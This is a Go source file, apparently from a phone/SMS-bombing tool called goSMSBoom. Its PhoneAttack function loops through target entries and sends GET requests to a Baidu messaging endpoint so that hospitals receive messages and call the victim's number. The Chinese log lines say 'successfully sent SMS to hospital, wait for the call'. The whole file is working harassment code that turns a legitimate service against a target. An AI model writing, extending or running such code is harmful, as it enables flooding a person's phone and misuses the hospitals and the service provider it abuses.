package attack

import (
	"encoding/json"
	"goSMSBoom/log"
	"goSMSBoom/model"
	"goSMSBoom/utils"
)

// PhoneAttack 处理电话轰炸
func PhoneAttack(booms []*model.PhoneMessage) error {
	for _, boom := range booms {
		url, err := utils.MontageURL("https://ada.baidu.com/imlp-message/imlp/send", boom)
		if err != nil {
			log.Println("拼接URL失败", err)
			return err
		}
		dos := utils.NewHttpDos(url, nil, nil)
		get, err := dos.Get()
		if err != nil {
			log.Println("get请求失败", err)
			return err
		}
		var resp map[string]any
		err = json.Unmarshal(get, &resp)
		if err != nil {
			log.Println("json解析失败", err)
			return err
		}
		if resp["status"].(float64) == 0.0 {
			log.Println("成功发送短信给医院,静等电话....")
		} else {
			log.Println("发送短信给医院失败,错误码", resp["status"].(float64))
		}
	}
	return nil
}
